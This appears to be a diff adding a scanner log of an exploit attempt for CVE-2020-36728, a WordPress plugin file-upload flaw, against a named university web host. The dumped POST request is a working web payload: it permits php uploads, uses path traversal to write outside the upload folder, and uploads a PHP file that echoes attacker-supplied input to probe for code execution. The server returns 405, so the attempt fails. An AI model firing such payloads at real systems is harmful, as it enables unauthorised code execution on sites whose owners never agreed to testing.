@@ -1,0 +1,55 @@
+[CVE-2020-36728] Dumped HTTP request for https://www.tbwl.esrc.unimelb.edu.au/wp-admin/admin-ajax.php?action=_ning_upload_image
+
+
+POST /wp-admin/admin-ajax.php?action=_ning_upload_image HTTP/1.1
+Host: www.tbwl.esrc.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 407
+Content-Type: multipart/form-data; boundary=b214a08e1c094defed15a5cc4c2285ee
+Accept-Encoding: gzip
+
+--b214a08e1c094defed15a5cc4c2285ee
+Content-Disposition: form-data; name="allowed_file_types"
+
+php,jpg,jpeg
+--b214a08e1c094defed15a5cc4c2285ee
+Content-Disposition: form-data; name="upload"
+
+{"dir": "../"}
+--b214a08e1c094defed15a5cc4c2285ee
+Content-Disposition: form-data; name="files[]"; filename="JhSQfm0d.php"
+
+<?php  echo base64_decode($_GET["input"]);?>
+--b214a08e1c094defed15a5cc4c2285ee--
+
+[CVE-2020-36728] Dumped HTTP response https://www.tbwl.esrc.unimelb.edu.au/wp-admin/admin-ajax.php?action=_ning_upload_image
+
+HTTP/1.1 405 Method Not Allowed
+Connection: close
+Content-Length: 422
+Allow: GET, HEAD, OPTIONS
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:19:00 GMT
+Server: AmazonS3
+Via: 1.1 67e0252f80139a17537e71117acd6be0.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: kXZq7o9ZLsbDnzgbYuX5sbc4yO0h5Z_6RQFmYB_QKAtldyj-jEV63w==
+X-Amz-Cf-Pop: IAD55-P6
+X-Cache: Error from cloudfront
+
+<html>
+<head><title>405 Method Not Allowed</title></head>
+<body>
+<h1>405 Method Not Allowed</h1>
+<ul>
+<li>Code: MethodNotAllowed</li>
+<li>Message: The specified method is not allowed against this resource.</li>
+<li>Method: POST</li>
+<li>ResourceType: OBJECT</li>
+<li>RequestId: 39HVX508QTF0KXZ2</li>
+<li>HostId: frp9vX9Aj5tS/0OeXkaDZV+BIpbRmLEQ/3pG3XM8c96ByjUCneFLOSAWjXvnfH7RH2zA459301M=</li>
+</ul>
+<hr/>
+</body>
+</html>
+
